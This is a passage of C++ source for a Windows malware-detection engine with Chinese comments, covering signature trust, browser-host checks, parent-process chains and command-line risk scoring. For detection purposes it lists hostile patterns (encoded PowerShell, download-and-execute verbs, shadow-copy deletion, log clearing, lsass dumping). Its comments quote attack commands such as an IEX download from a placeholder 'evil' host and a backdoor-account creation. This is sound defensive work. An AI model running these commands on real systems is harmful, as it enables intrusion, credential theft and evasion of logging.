                        int need = WideCharToMultiByte(CP_UTF8, 0, name, -1, nullptr, 0, nullptr, nullptr);
                        if (need > 1) {
                            signer.resize(need - 1);
                            WideCharToMultiByte(CP_UTF8, 0, name, -1, &signer[0], need, nullptr, nullptr);
                        }
                    }
                    CertFreeCertificateContext(ctx);
                }
                CertCloseStore(store, 0);
            }
        }
    }

    // ★★ 2026-10-02 修复（这是**第二条**独立的误报路径，与 scanner.cpp 的前缀比较那条不同）
    //
    //  症状：微软正版系统服务被判「白加黑侧加载劫持（档2 铁证）」并送检 + 锁原件。
    //        日志实证：`[sideload] 铁证 dll=…\uxtheme.dll host=msra.exe`、
    //        `[sideload] 铁证 …esent.dll host=TieringEngineService.exe`。
    //
    //  原因（两层叠加，缺一不可）：
    //    ① 本函数以前**只查嵌入式签名** —— CryptQueryObject + PKCS7_SIGNED_EMBED。
    //       而微软的系统 DLL（uxtheme.dll / esent.dll / comctl32.dll / dbghelp.dll …）
    //       **只有目录签名（.cat），没有嵌入签名** → 这里一律判"无签名"。
    //    ② sideload::Find 在 System32 里的系统 exe 上出现"自指"：
    //       被测 exe 在 System32 → dir = System32 → 它导入的 uxtheme.dll 也解析到
    //       System32\uxtheme.dll，于是 cand 与"系统同名 DLL"**是同一个文件**。
    //       ①说它"无签名"、②说"系统已提供同名却有无签名副本" → 判「档2 铁证劫持」。
    //
    //  修法：嵌入签名缺失时回退到 SigTrustedCached（复用 scanner.cpp 的
    //        HasValidSignature，其中含**目录签名**验证与路径规范化）。
    //
    //  **能力绝不减**：攻击者塞进来的假冒 DLL，其哈希不在微软签名的 .cat 里，
    //  目录签名同样验不过 → 仍判"无签名" → 该报的照报（见 HasCatalogSignature ③）。
    //  这里只是把"微软自己的系统 DLL"从"无签名"里摘出来。
    //
    //  注：sideload.cpp 那处"同一文件自指"的语义问题**刻意不单独修** ——
    //      若在那边加一句"cand 落在系统目录就跳过"，会连"System32 里的 DLL 被
    //      替换成恶意版本"这种形态一起放过（那是真实攻击，不该放过）。
    //      根因是签名判定，就在这里修；修好之后自指那条分支自然不再触发。
    if (!signedOk && SigTrustedCached(path)) {
        signedOk = true;
        if (signer.empty()) signer = "（目录签名 / catalog）";
    }

    {
        std::lock_guard<std::mutex> lk(g_signMutex);
        if (g_signCache.size() > 8192) g_signCache.clear();
        SignCacheEntry e; e.state = signedOk ? 1 : 0; e.signer = signer;
        g_signCache[path] = e;
    }
    if (outSignerName) *outSignerName = signer;
    return signedOk;
}

// ---------------------------------------------------------------------------
//  可信发起者校验 —— 替代旧版「命令行含某字符串即豁免」的危险做法
//
//  旧实现：if (命令行含 "chrome-extension://" || "nativemessaging" || "--parent-window=")
//              return level 0;
//  → 攻击者在自己的命令行尾部加一个 "--parent-window=0" 就整条链洗白。
//
//  新实现要求**两个条件同时成立**：
//    ① 父进程确实是浏览器（名字在 kBrowser 里），且**该浏览器文件带数字签名**
//       —— 攻击者要伪造就得先拿到 Chrome/Edge 的签名，这是做不到的；
//    ② 命令行里出现**真实的命名管道路径**（\\.\pipe\ 开头），而不是随便一个字符串
//       —— 浏览器拉起 Native Messaging 宿主时必须走管道转发，管道名是内核对象，
//          伪造不了（要真建一个同名管道才能通信）。
//  另：如果命令行还带其它高危特征（如 -EncodedCommand），豁免不生效，继续走判定。
// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
//  进程信誉门（2026-09-19 新增，wallpaper64.exe 误杀事故的根治）
//  用途：所有「终止进程」决策前的最后守门（回滚终止 / WmiSink 终止 /
//        bootguard 拦截链）。评分体系里的信誉调权（FinalizeScoreLevel）
//        决定"多可疑"，本函数决定"能不能杀"——两件事必须分开。
//  判可信：① 签名者命中知名厂商名单；或 ② 有签名且安装在可信目录。
//  未签名一律不可信（勒索/银狐载荷几乎都不签名）。
//  注意：内部 FileIsSigned 带缓存（同路径只做一次磁盘 IO），且本函数
//        不持任何锁，符合「缓存函数不得持锁做 I/O」铁律。
// ---------------------------------------------------------------------------
bool ProcReputable(const std::string& exePath) {
    if (exePath.empty()) return false;
    std::string signer;
    if (!FileIsSigned(exePath, &signer)) return false;   // 未签名 → 不可信
    static const char* kVendors[] = {
        "valve", "steam", "microsoft", "google", "mozilla", "nvidia",
        "amd", "intel", "apple", "adobe", "tencent", "netease", "bilibili",
        "kingsoft", "qihoo", "huorong", "huawei", "lenovo", "alibaba",
        "baidu", "bytedance", "douyin", "wps", "python software", "github",
        "kaspersky", "eset", "bitdefender", "avast", "avg",
        // ---- ★ 反作弊 / 游戏厂商（2026-09-20 新增，防空杀反作弊）----
        // 依据：这些厂商的组件普遍带有效签名，且常以「服务 + 内核驱动 + 随机名伴随模块」
        // 形态常驻（Vanguard 开机自启、EAC 随游戏加载），行为画像与银狐高度相似
        // （自启、注入其它进程、写驱动、提权），极易被误拦。
        // 签名者名称按各家实际 Authenticode 主体填写，同时补产品名（不同版本签名主体不一）。
        "easy anti-cheat", "easyanticheat", "epic games", "kamucli",
        "battleye", "battleye gmbh",
        "riot games", "riot vanguard",
        "wellbia", "xigncode", "wemade", "inca internet",
        "nprotect", "inca",
        "faceit", "esl", "esea",
        "electronic arts", "ea games",
        "ubisoft", "rockstar", "take-two",
        "activision", "blizzard", "battle.net",
        "garena", "krafton", "nexon", "ncsoft", "smilegate", "pearl abyss",
        "bandai namco", "square enix", "capcom", "sega", "konami",
        "perfect world", "mihoyo", "hoyoverse", "cognosphere", "kuro game", "hypergryph",
        "ant group", "antgroup",           // ACE 反作弊（腾讯 ACE / 阿里系）
        "gameanticheat", "anticheatexpert",
        "wargaming", "gaijin", "digital extremes", "grinding gear",
        "cd projekt", "paradox interactive", "bohemia interactive",
        "unity technologies", "epic",
    };
    std::string low = signer;
    for (auto& c : low) c = (char)tolower((unsigned char)c);
    for (const char* v : kVendors)
        if (low.find(v) != std::string::npos) return true;
    // 有签名但厂商不在名单：安装路径可信也算（正常商业软件的正常位置）
    std::string pl = exePath;
    for (auto& c : pl) c = (char)tolower((unsigned char)c);
    if (pl.find("\\program files") != std::string::npos ||
        pl.find("\\steamapps\\") != std::string::npos ||
        pl.find("\\windows\\system32\\") != std::string::npos) return true;
    return false;
}

bool IsTrustedBrowserHost(const std::string& parentImagePath,
                          const std::string& commandLine) {
    // 条件①：父进程是浏览器 + 有签名
    std::string p = Lower(BaseName(parentImagePath));
    if (p.empty() || !IN_LIST(p, kBrowser)) return false;
    if (!FileIsSigned(parentImagePath)) {
        // 父进程名字叫 chrome.exe 但没有签名 → 可能是假冒的浏览器（可疑）
        return false;
    }

    // 条件②：命令行里有真实的命名管道路径
    std::string lc = Lower(commandLine);
    bool pipeOk = Has(lc, "\\\\.\\pipe\\") || Has(lc, "\\\\?\\pipe\\");
    if (!pipeOk) return false;

    // 附加条件③：命令行里不能同时出现明显的高危语义（避免"真浏览器 + 恶意参数"被整体豁免）
    static const char* kDeny[] = {
        "-encodedcommand", "-enc ", "frombase64string", "invoke-expression", "iex(",
        "downloadstring", "downloadfile", "mshta http", "scrobj.dll",
        "vssadmin delete shadows", "wevtutil cl", "windowstyle hidden", "w hidden"
    };
    for (const char* d : kDeny) if (Has(lc, d)) return false;

    return true;
}

// ---------------------------------------------------------------------------
//  Windows 自身的 Native Messaging 管道转发也走 cmd —— 但父进程是浏览器，
//  同样验证父进程签名（浏览器本体）。这是对上面函数的补充：
//  有些浏览器拉起的命令行不带 chrome-extension:// 但管道名是 chrome.nativeMessaging。
// ---------------------------------------------------------------------------
static bool IsNativeMessagingPipe(const std::string& cmdLower) {
    return Has(cmdLower, "chrome.nativemessaging") ||
           Has(cmdLower, "native_messaging") ||
           Has(cmdLower, ".pipe\\chrome") ||
           Has(cmdLower, "firefox")  && Has(cmdLower, "\\\\.\\pipe\\");
}

// ---------------------------------------------------------------------------
//  父进程链判定
//  依据：Defender 官方 Pyordono.A（脚本引擎以可疑参数执行 cmd/powershell）
//        + 卡巴 AEP（可信程序被利用执行可疑代码也要拦）
// ---------------------------------------------------------------------------
ProcVerdict JudgeParentChain(const std::string& parentImagePath,
                             const std::string& childImagePath,
                             const std::string& childCommandLine) {
    ProcVerdict v;
    std::string p = Lower(BaseName(parentImagePath));
    std::string c = Lower(BaseName(childImagePath));
    if (p.empty() || c.empty()) return v;
    if (!IN_LIST(c, kHosts)) return v;          // 子进程不是脚本宿主 → 本条不适用

    // 外置白名单父进程（用户可自定义）
    {
        std::lock_guard<std::mutex> lk(g_ruleMutex);
        for (const auto& w : g_whiteParents) if (w == p) return v;
    }

    // 父进程是浏览器 → 交给可信发起者校验，不在这里粗暴判档
    if (IN_LIST(p, kBrowser)) {
        if (IsTrustedBrowserHost(parentImagePath, childCommandLine)) return v;  // 真宿主 → 放行
        v.level = 1; v.score = 35; v.tag = "browser-spawn-host";
        v.reason = "浏览器 " + p + " 派生了命令/脚本宿主 " + c +
                   "，但未能验证为 Native Messaging 正常调用，可能是漏洞利用或恶意下载后执行";
        return v;
    }
    if (IN_LIST(p, kOffice)) {
        v.level = 2; v.score = 70; v.tag = "office-spawn-host"; v.hard = true;
        v.reason = "文档程序 " + p + " 派生了命令/脚本宿主 " + c +
                   "，这是宏病毒与文档漏洞利用的典型链，正常文档不会这么做";
        return v;
    }
    if (IN_LIST(p, kIm)) {
        v.level = 2; v.score = 70; v.tag = "im-spawn-host"; v.hard = true;
        v.reason = "聊天软件 " + p + " 派生了命令/脚本宿主 " + c +
                   "，常见于「发文件让你执行」类钓鱼";
        return v;
    }
    if (IN_LIST(p, kHosts) && p != c) {
        v.level = 1; v.score = 25; v.tag = "host-chain";
        v.reason = "命令/脚本宿主链式调用（" + p + " → " + c + "），需结合命令行判断";
        return v;
    }
    // 注意：explorer.exe → cmd/powershell 是用户正常开命令行，此处**不报**（控制误报）
    return v;
}

// ---------------------------------------------------------------------------
//  评分层定档：把累计分数映射成风险等级。
//
//  ⚠️ 踩坑（2026-09-18 回归测试暴露）：这段逻辑原先**只写在 JudgeProcessInner 里**，
//     而 JudgeCommandLine 直接 return，导致「单独判定命令行」这条路径上
//     分数累加了却永远不升级 —— 实测 `net user backdoor P@ss /add` 得 45 分、
//     `wevtutil sl Security /e:false` 得 50 分（均远超 level 1 阈值 30），
//     返回的却是 level=0。
//     影响面：所有**以命令行为唯一事件源**的调用点（文件落地 / 计划任务 /
//     注册表启动项）全部漏报。硬规则路径不受影响（硬规则自带 level）。
//     正解：抽成函数，两条路径共用同一个阈值来源。
//
//  阈值依据：对齐 Bitdefender ATC 的「多信号累加 + 阈值」思路，
//            具体数值由本项目回归测试（误报 0% 为目标）反推得出。
// ---------------------------------------------------------------------------
static void FinalizeScoreLevel(ProcVerdict& v) {
    if (v.hard) return;                     // 硬规则自带等级，不参与评分定档
    if (v.score >= 55)      { v.level = 2; }
    else if (v.score >= 30) { v.level = 1; }
    else                    { v.level = 0; if (v.score < 15) v.reason.clear(); }
}

// ---------------------------------------------------------------------------
//  命令行判定（对**归一化后**的文本做匹配）
// ---------------------------------------------------------------------------
ProcVerdict JudgeCommandLine(const std::string& commandLine, const std::string& imagePath) {
    ProcVerdict v;
    if (commandLine.empty()) return v;

    // ★ 关键：先归一化再匹配。这是抗绕过的第一道防线。
    std::string l = NormalizeCommandLine(commandLine);
    if (l.empty()) return v;

    const std::string lbase = Lower(BaseName(imagePath));

    // ---- 解释器识别：与解释器绑定的规则必须先确认解释器在场 ----
    // 为什么要这一步：避免「文档里恰好写了 downloadstring 这个词」之类误命中。
    const bool ps   = Has(l, "powershell") || Has(l, "pwsh") || lbase == "powershell.exe" ||
                      lbase == "pwsh.exe";
    const bool host = ps || Has(l, "mshta") || Has(l, "wscript") || Has(l, "cscript") ||
                      Has(l, "rundll32") || Has(l, "regsvr32") || Has(l, "certutil") ||
                      Has(l, "bitsadmin") || Has(l, "cmd.exe") || Has(l, "cmd /") ||
                      lbase == "cmd.exe" || lbase == "mshta.exe" || lbase == "wscript.exe" ||
                      lbase == "rundll32.exe" || lbase == "regsvr32.exe" ||
                      lbase == "certutil.exe" || lbase == "msbuild.exe" ||
                      lbase == "installutil.exe";
    const bool psOrScript = ps || Has(l, "mshta") || Has(l, "wscript") || Has(l, "cscript") ||
                            lbase == "powershell.exe" || lbase == "mshta.exe" ||
                            lbase == "wscript.exe" || lbase == "cscript.exe";

    // ---- PS 编码命令（-enc / -EncodedCommand）----
    // 归一化去掉了引号与转义符，所以 "-e^n^c" / "-Enc" / '"-e"' 都能命中。
    if (ps) {
        if (Has(l, "-encodedcommand") || Has(l, "-enc ") || Has(l, "-e ") ||
            Has(l, " /enc ") || Has(l, " /encodedcommand")) {
            // ★ 2026-09-22 降级：原为 hard=true/score=70（一票否决直接终止）。
            //   降级理由：这是**唯一的二元身份判据**，而 AI Agent（WorkBuddy/OpenClaw
            //   等）把命令 base64 打包是工具链常态，不是免杀。若保留 hard，等于
            //   对所有 Agent 办公程序一票判死。
            //   为什么不加白名单豁免：白名单靠名字/路径，攻击者改名换目录即可绕过，
            //   开源项目更是把绕过方法直接公开。改评分权重则对所有进程一视同仁 ——
            //   攻击者伪装成 Agent 拿不到任何额外好处。
            //   安全强度由组合信号补回：本项 45 分 + 外联/下载/落文件叠加仍会过阈值。
            v.level = (v.level < 1) ? 1 : v.level; v.score += 45; v.tag = "ps-encoded";
            v.reason = "PowerShell 以 -EncodedCommand 执行编码命令（免杀常用手法，"
                       "但自动化工具链也普遍如此，需结合是否有网络外联与落地文件判断）";
        }
        // -nop / -w hidden / -ep bypass 三件套组合 = 典型的攻击用法
        int combo = (Has(l, "-nop") || Has(l, "-noprofile") ? 1 : 0)
                  + (Has(l, "-w hidden") || Has(l, "windowstyle hidden") ? 1 : 0)
                  + (Has(l, "-ep bypass") || Has(l, "-executionpolicy bypass") ||
                     Has(l, "bypass") ? 1 : 0);
        if (combo >= 2) {
            // ★ 2026-09-22 降级：原 hard=true/score=60。理由同 ps-encoded ——
            //   Agent 工具链普遍带 -nop/-w hidden/bypass（非交互式执行必需品）。
            // ★ 2026-09-24 降权 40 → 10：`-ExecutionPolicy Bypass` 在正常安装脚本、
            //   自动化工具、Agent 里都极常见，属**弱旁证**而非独立证据（银泊 09-24 反馈：
            //   开机时 powershell 被误判终止）。真正的高危是「绕过 + 远程载荷/编码命令」——
            //   那由 ps-encoded(45) 与 downloadstring/iex 等硬规则各自拿下，底线不降。
            v.level = (v.level < 1) ? 1 : v.level; v.score += 10; v.tag = "ps-bypass";
            v.reason = "PowerShell 以「无配置 + 隐藏窗口 + 绕过执行策略」组合启动，"
                       "恶意脚本标准参数，但自动化工具链亦普遍如此，需结合外联判断";
        }
        if (Has(l, "-nop") && Has(l, "-c ")) {
            // ★ 2026-09-22 修 bug：原为 `v.score = 35`（**赋值**），会把上面
            //   ps-encoded 已累加的 45 分整个覆盖成 35 —— 命中越多分反而越低。
            //   正解：累加，且仅在尚未被 ps-bypass 计过时补计（避免重复）。
            if (v.tag != "ps-bypass") {
                v.level = (v.level < 1) ? 1 : v.level;
                v.score += 5; v.tag = "ps-nop";    // 20 → 5：`-nop` 只是弱旁证
                v.reason = "PowerShell 以 -NoProfile -Command 执行，"
                           "常见于自动化脚本，需结合内容判断";
            }
        }
    }

    // ---- 隐藏窗口（通用，不只 PS）----
    // ★ 2026-09-22：注意 ps-bypass 的 combo 判据**已包含 `-w hidden`** ——
    //   若此处再独立加一次，同一子串会被计两次（实测 40+30=70 判高危，
    //   而它只是 Agent 的标准非交互启动参数）。故 combo 命中后本段跳过。
    if (host && (Has(l, "windowstyle hidden") || Has(l, "w hidden") || Has(l, "-hidden"))) {
        if (v.level < 2 && v.tag != "ps-bypass") {
            // ★ 2026-09-22 降级：原 hard=true/score=55。
            v.level = 1; v.score += 12; v.tag = "hidden";   // 30 → 12：隐藏窗口是弱旁证
            v.reason = "以隐藏窗口方式执行命令（规避用户察觉的常见手法，"
                       "但守护进程/自动化任务也普遍如此，需结合外联判断）";
        }
    }

    // ---- rundll32 加载【系统目录之外】的 DLL ----
    // 依据：Bitdefender 明确把 DLL 侧载列为高危行为；正常 rundll32 调用都在 System32。
    // 注意：这条**不能**因为命令行含 http/路径就无脑命中，必须同时有 .dll, 与
    //       非系统目录引用 —— 否则会误伤 shell32.dll,Control_RunDLL 这类正常调用。
    if (Has(l, "rundll32") || lbase == "rundll32.exe") {
        if (Has(l, ".dll,") || Has(l, ".dll ")) {
            bool inSystem = Has(l, "\\windows\\") || Has(l, "system32") || Has(l, "syswow64");
            if (!inSystem) {
                v.level = 2; v.score = 65; v.hard = true; v.tag = "rundll32";
                if (Has(l, "comsvcs")) {
                    v.reason = "rundll32 调用 comsvcs.dll 转储 lsass，这是凭据窃取的标准手法";
                    v.tag = "cred";
                } else {
                    v.reason = "rundll32 加载了系统目录之外的 DLL，这是白利用（侧加载）的典型形态";
                }
                return v;
            }
        }
        // rundll32 + javascript:/vbscript: 也是白利用
        if (Has(l, "javascript:") || Has(l, "vbscript:")) {
            v.level = 2; v.score = 65; v.hard = true; v.tag = "rundll32";
            v.reason = "rundll32 执行内联脚本，属于白利用（Squiblydoo 变种）";
            return v;
        }
    }

    // ---- 表驱动硬规则 ----
    // ★ 2026-09-22 修漏报（回归测试抓出）：规则串写的是 `vssadmin delete shadows`，
    //   但真实银狐常用**完整路径**调用（`C:\Windows\System32\vssadmin.exe delete shadows`），
    //   归一化后中间夹着 `.exe` —— 子串匹配不上，勒索动作直接漏过。
    //   正解：额外构造一份「去掉 .exe 后缀」的归一化串参与匹配。
    //   注意：只用于**规则匹配**，不改 `l` 本身（其它判据依赖原始形态）。
    std::string lNoExe;
    {
        lNoExe.reserve(l.size());
        for (size_t i = 0; i < l.size(); ) {
            // 命中 ".exe" 且后面是分隔符（空格/引号已归一化掉）或串尾 → 跳过这 4 字节
            if (i + 4 <= l.size() &&
                l[i] == '.' && l[i+1] == 'e' && l[i+2] == 'x' && l[i+3] == 'e' &&
                (i + 4 == l.size() || l[i+4] == ' ' || l[i+4] == '\\' || l[i+4] == '/')) {
                i += 4;
                continue;
            }
            lNoExe += l[i];
            ++i;
        }
    }
    // ---- 关闭安全软件：通用「动作 + 目标」判据（2026-09-24，先于规则表执行）----
    {
        std::string selfLow = Lower(imagePath);        // 用于「杀软自身豁免」（本函数形参）
        std::string tgt, vrb;
        if (HitKillSav(l, lNoExe, selfLow, tgt, vrb)) {
            v.level = 2; v.score = 70; v.hard = true; v.tag = "killsav";
            v.reason = "针对安全软件的破坏性操作（" + vrb + " → " + tgt +
                       "），银狐关闭防护的常用手法";
            return v;
        }
    }

    for (const auto& r : kHardRules) {
        if (Has(l, r.needle) || Has(lNoExe, r.needle)) {
            if (r.level >= 2) {
                v.level = 2; v.score = r.score; v.tag = r.tag; v.reason = r.reason; v.hard = true;
                return v;
            }
            if (r.level == 1 && v.level < 1) {
                v.level = 1; v.score += r.score; v.tag = r.tag; v.reason = r.reason;
            }
        }
    }

    // ---- 外置规则（热更新）----
    {
        std::lock_guard<std::mutex> lk(g_ruleMutex);
        for (const auto& r : g_extRules) {
            // ★ 2026-10-03：`wordBoundary` 的规则走 HasWord（要求 needle 前后是分隔符），
            //   其余仍走原来的纯子串 find —— **不改变其它 100+ 条规则的既有行为**。
            const bool matched = r.wordBoundary
                ? (HasWord(l, r.needle.c_str()) || HasWord(lNoExe, r.needle.c_str()))
                : (l.find(r.needle) != std::string::npos ||
                   lNoExe.find(r.needle) != std::string::npos);
            if (matched) {
                if (r.level >= 2) {
                    v.level = 2; v.score = r.score ? r.score : 60; v.tag = r.tag;
                    v.reason = r.reason; v.hard = true;
                    return v;
                }
                if (r.level >= 1 && v.level < 1) {
                    v.level = 1; v.score += r.score; v.tag = r.tag; v.reason = r.reason;
                } else if (r.level == 0) {
                    v.score += r.score;
                }
            }
        }
    }

    // ---- 脚本宿主 + 远程 URL → 升级（Defender 无文件检测思路）----
    // ★★ 2026-09-23 收紧：修「WorkBuddy 被误杀」（银泊的 IDE 被本规则终止）
    //
    //  原判据「解释器字样 + 任意 URL」过于宽松 —— 实测命中场景：
    //    WorkBuddy.exe … --permission-mode fullAccess --allowedTools powershell,bash …
    //  命令行里只是**工具名列表提到 powershell** + 一个正常配置 URL，
    //  就被判 host-url 硬拦并 TerminateProcess。
    //
    //  真正的「脚本宿主执行远程载荷」必须满足其一：
    //    ① 宿主是 mshta / wscript / cscript / rundll32 / regsvr32
    //       —— 这些程序的用途就是执行文件/URL，出现 URL 即异常；
    //    ② URL 指向**可执行载荷**（.ps1/.vbs/.hta/.exe/… 且为 URL 结尾）。
    //
    //  安全底线不变：若 URL 内容被执行，必然伴随 downloadstring / iex /
    //  frombase64string 等动作 —— 那些规则各自都是 level 2 硬拦，
    //  所以「无扩展名 URL + 内存执行」依旧会被拿下，只是不再一刀切。
    //
    //  ★ 2026-09-22：这一条是方案一降级后安全底线的支点，**不要取消**，
    //    只按上面两条收紧（判的是动作本身，与进程身份无关）。
    const bool pureUrlHost = (lbase == "mshta.exe" || lbase == "wscript.exe" ||
                              lbase == "cscript.exe" || lbase == "rundll32.exe" ||
                              lbase == "regsvr32.exe");
    if (psOrScript && (Has(l, "http://") || Has(l, "https://") || Has(l, "ftp://"))) {
        // URL 结尾的载荷扩展名判断：必须紧跟 URL 终止符，避免
        // `.json` 被 `.js` 命中、`.ps1xml` 之类误判。
        static const char* kExts[] = { ".ps1", ".psm1", ".vbs", ".vbe", ".wsf", ".wsh",
                                       ".hta", ".exe", ".dll", ".bat", ".cmd", ".scr",
                                       ".msi", ".jar", ".jse", ".js", ".py", ".sh" };
        bool urlIsPayload = false;
        for (const char* ext : kExts) {
            const size_t el = strlen(ext);
            size_t p = 0;
            while ((p = l.find(ext, p)) != std::string::npos) {
                const size_t e = p + el;
                const char c = (e < l.size()) ? l[e] : '\0';
                if (c == '\0' || c == '"' || c == '\'' || c == ' ' || c == '?' ||
                    c == '&' || c == ')' || c == '|' || c == '>' || c == '#' ||
                    c == ';' || c == ',') { urlIsPayload = true; break; }
                ++p;
            }
            if (urlIsPayload) break;
        }
        // ★ 第三条收紧（2026-09-23）：URL + 下载/执行动词（含 PowerShell 缩写）
        //
        //  为什么加：收紧前两条后实测露出一个缺口 ——
        //    powershell -c "IEX (iwr https://evil/x)"      （无扩展名 URL）
        //  判 0 分放行！因为规则库里写的是全称 invoke-expression / invoke-webrequest，
        //  而银狐惯用缩写 `iex(iwr ...)`。故此处按「取回并执行」的组合语义兜底。
        //
        //  ⚠️ 必须用**词边界**匹配：`Has(l,"iex")` 会命中 `iexplore`（IE/浏览器命令行
        //     天然含 URL）→ 把浏览器一网打尽。见下面的 hasWord lambda。
        auto hasWord = [](const std::string& s, const char* w) {
            const size_t wl = strlen(w);
            size_t p = 0;
            while ((p = s.find(w, p)) != std::string::npos) {
                const bool leftOk  = (p == 0) ||
                                     !isalnum((unsigned char)s[p - 1]);
                const size_t e = p + wl;
                const bool rightOk = (e >= s.size()) ||
                                     !isalnum((unsigned char)s[e]);
                if (leftOk && rightOk) return true;
                ++p;
            }
            return false;
        };
        //  ★ 只认「取回并**执行**」的动词 —— 取回本身是正常行为（下载文件、调 API）。
        //    实测教训：把 invoke-restmethod / iwr / curl 也算进来时，
        //    `powershell -c "Invoke-RestMethod https://api.github.com/…"` 被判 host-url
        //    硬拦 —— 而它是最常见的正常 API 调用形态，属于自己造误报。
        //    银狐的真实形态是 `iex(iwr …)` / `IEX(irm …)`：执行动词在，
        //    所以只留「执行」与「下载到内存」两类。
        //    （curl/wget/certutil/start-bitstransfer 这类"取回/传输"动作另有
        //      独立规则覆盖，不在这里重复。）
        const bool hasExecVerb =
            hasWord(l, "iex") ||
            Has(l, "invoke-expression") ||
            Has(l, "downloadstring") || Has(l, "downloadfile") ||
            Has(l, "downloaddata");

        if (pureUrlHost || urlIsPayload || hasExecVerb) {
            v.level = 2; v.score = 75; v.hard = true; v.tag = "host-url";
            v.reason = "脚本宿主直接执行远程 URL 内容，属于远程载荷执行（无文件攻击典型形态）";
        }
    }

    // ---- 评分项：可疑但不是确凿恶意，累加权重 ----
    // ⚠️ 踩坑（重复计分）：曾同时写 Has(l, "temp\\") 与 Has(l, "\\temp") ——
    //    这俩在子串匹配下是**同一个信号**（`C:\Temp\` 两个都命中），等于路径里
    //    出现一个临时目录就白拿 20 分。实测把 C:\Temp\ 下的正常程序判到 30 分
    //    → 误报。正解：一个语义信号只写一条，并优先用带路径分隔符的形式。
    //
    // ⚠️ 二次踩坑（2026-09-22）：原守卫是 `if (v.level < 2)`，但上面 ps-encoded
    //    降级后只把 level 设为 1，本区仍会执行 —— 于是 `encoded` 又加 10 分，
    //    与 ps-encoded 的 45 分重复计分。正解：改用**独立标志**判断是否已计过，
    //    而不是拿 level 当守卫（level 现在是「当前最高档」，不再是「是否已命中」）。
    {
        // 仅当上方未给出硬结论时才累加（hard 已在 host-url 处 return 语义）
        if (!v.hard) {
            // ⚠️ 三次踩坑（2026-09-22）：互斥判断最初只挡了 encoded / hidden，
            //    结果 `-nop -w hidden -ep bypass` 这种**一次启动参数**被拆成
            //    ps-bypass(40) + hidden(30) + bypass(15) + nop(10) = 95 分判高危 ——
            //    而它正是 Agent / 守护进程的标准启动组合。
            //    正解：**按 tag 整体互斥** —— 同一语义簇（PS 启动参数）只取其
            //    最高一项，不再逐个子串重复累加。
            const bool alreadyPsFamily = (v.tag == "ps-encoded" ||
                                          v.tag == "ps-bypass"  ||
                                          v.tag == "ps-nop");
            const bool alreadyHidden  = (v.tag == "hidden");
            // PS 启动参数簇：已有 ps-* 命中则整簇跳过（避免自我重复计分）
            if (!alreadyPsFamily) {
                if (Has(l, "-nop") || Has(l, "noprofile"))  v.score += 10;
                if (Has(l, "-ep bypass") || Has(l, "executionpolicy bypass") ||
                    Has(l, "bypass"))                       v.score += 15;
                if (Has(l, "-w hidden") || Has(l, "windowstyle hidden")) v.score += 10;
            }
            // 隐藏窗口：hidden 标签已计则跳过
            if (!alreadyHidden && !alreadyPsFamily &&
                (Has(l, "hidden") || Has(l, "-hidden")))    v.score += 15;
            // ---- 与 PS 启动参数无关的独立信号（正常累加）----
            if (Has(l, "\\temp\\") || Has(l, "\\tmp\\"))    v.score += 10;
            if (Has(l, "\\appdata\\"))                      v.score += 10;
            if (Has(l, "\\public\\"))                       v.score += 10;
            if (Has(l, "http://") || Has(l, "https://"))    v.score += 10;
            if (Has(l, "base64"))                           v.score += 15;
            if (Has(l, ".txt"))                             v.score += 5;
            if (Has(l, "\\programdata\\"))                  v.score += 10;
        }
    }

    // ---- 评分层定档（关键：单独判定命令行时也必须定档，否则全体漏报）----
    FinalizeScoreLevel(v);
    return v;
}

// ---------------------------------------------------------------------------
//  映像路径判定
// ---------------------------------------------------------------------------
static ProcVerdict JudgeImagePath(const std::string& imagePath) {
    ProcVerdict v;
    if (imagePath.empty()) return v;
    std::string l = Lower(imagePath);
    std::string base = Lower(BaseName(imagePath));

    // 伪装系统进程：系统名出现在非系统目录
    if (IN_LIST(base, kSystemNames)) {
        // ★ 2026-10-03 修正（Win10 虚拟机实测误杀 Defender 组件 ×2）：
        //   原判据只认 `\windows\` 及其子目录，而 Defender 组件的真实安装路径是
        //   `C:\Program Files\Windows Defender\NisSrv.exe`
        //   —— 注意 `\Windows ` **带空格** ⇒ **不匹配 `\windows\`** ⇒ inSystem=false
        //      ⇒ 必判 masquerade（level=2 / hard=true）。
        //   实证：VM 日志 22:04:18 / 22:10:40 两条 `高 [masquerade]`。
        //
        //   ★★★ 两次踩坑的教训（**放宽判据比收紧更危险**）：
        //     坑一：直接查 kTrustedDirs —— 它含 `\program files\`，
        //           等于「任何放进 Program Files 的 svchost 都不算伪装」，
        //           而那**恰是 masquerade 要抓的形态**。
        //     坑二：把整个 Defender 目录当 inSystem —— 同样过宽，
        //           `C:\Program Files\Windows Defender\svchost.exe`（假的）会被放过。
        //     ⇒ **正解：按「目录 + 文件名」双条件精确豁免**，
        //       目录只是必要条件，文件名仍必须在 kSystemNames 名单里（这已是前提）。
        //   ⇒ 另一个方向也要防：`...\Windows Defender\NisSrv.exe.exe`（多一个 .exe）
        //     不在名单里 ⇒ 仍应判伪装 ⇒ 目录豁免**不能**按前缀放行。
        bool inSystem = Has(l, "\\windows\\system32\\") || Has(l, "\\windows\\syswow64\\") ||
                        Has(l, "\\windows\\winsxs\\") || Has(l, "\\windows\\");
        // 微软安全组件的真实安装目录（Windows 8 起固定在 Program Files 下，目录名带空格）。
        //
        // ★★★★ 这里连踩三次坑，**放宽判据比收紧更危险**，第四次才做对。留作教训：
        //   坑一：查 kTrustedDirs —— 它含 `\program files\`，
        //         等于「任何放进 Program Files 的 svchost 都不算伪装」，
        //         而那恰是 masquerade 要抓的形态。
        //   坑二：把整个 Defender 目录当 inSystem —— 同样过宽，
        //         `...\Windows Defender\svchost.exe`（假的）会被放过。
        //   坑三：用 `l.compare(0, dn, d) == 0` 从串首比 —— 但 `l` 是完整路径
        //         `c:\program files\...`，前面还隔着盘符 ⇒ **永远不等**，
        //         结果真阳性一起丢（Defender 组件仍被判伪装）。
        //   坑四（本次自测抓到）：只校验「目录之后没有子目录」——
        //         `...\Windows Defender\svchost.exe` 同样满足，但**svchost 根本不是
        //         Defender 的组件**，放在那儿就是冒名顶替。
        //
        // ⇒ 正解：**按组件名单豁免，不按目录豁免**。
        //   目录只是「候选」信号，真正放行要**文件名在该目录的合法组件名单里**。
        //   这是唯一同时满足「不误杀 Defender」与「不放过冒名」的判据。
        if (!inSystem) {
            static const char* kDefenderDirs[] = {
                "\\program files\\windows defender\\",
                "\\program files (x86)\\windows defender\\",
                "\\microsoft\\windows defender\\",     // WOW64 重定向形态
            };
            // 该目录下的合法组件（Defender 真实会放的 exe）
            static const char* kDefenderReal[] = {
